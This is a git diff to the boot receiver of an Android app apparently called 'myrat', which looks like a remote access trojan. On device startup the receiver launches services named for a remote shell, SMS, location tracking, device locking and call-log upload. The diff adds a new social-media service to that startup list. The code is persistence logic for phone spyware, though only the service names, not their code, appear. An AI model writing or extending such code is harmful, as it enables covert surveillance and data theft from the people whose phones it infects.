@@ -13,6 +13,7 @@ import com.myrat.app.service.LocationService
 import com.myrat.app.service.LockService
 import com.myrat.app.service.ShellService
 import com.myrat.app.service.SmsService
+import com.myrat.app.service.SocialMediaService
 
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent?) {
@@ -26,6 +27,7 @@ class BootReceiver : BroadcastReceiver() {
             } else {
                 context.startService(serviceIntentCommand)
             }
+            
             val serviceIntentCalls = Intent(context, CallLogUploadService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntentCalls)
@@ -53,6 +55,7 @@ class BootReceiver : BroadcastReceiver() {
             } else {
                 context.startService(serviceIntentLocation)
             }
+            
             val serviceIntentcall = Intent(context, CallService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntentcall)
@@ -65,6 +68,13 @@ class BootReceiver : BroadcastReceiver() {
                 context.startForegroundService(serviceIntentLock)
             } else {
                 context.startService(serviceIntentLock)
+            }
+
+            val serviceIntentSocialMedia = Intent(context, SocialMediaService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntentSocialMedia)
+            } else {
+                context.startService(serviceIntentSocialMedia)
             }
         }
     }
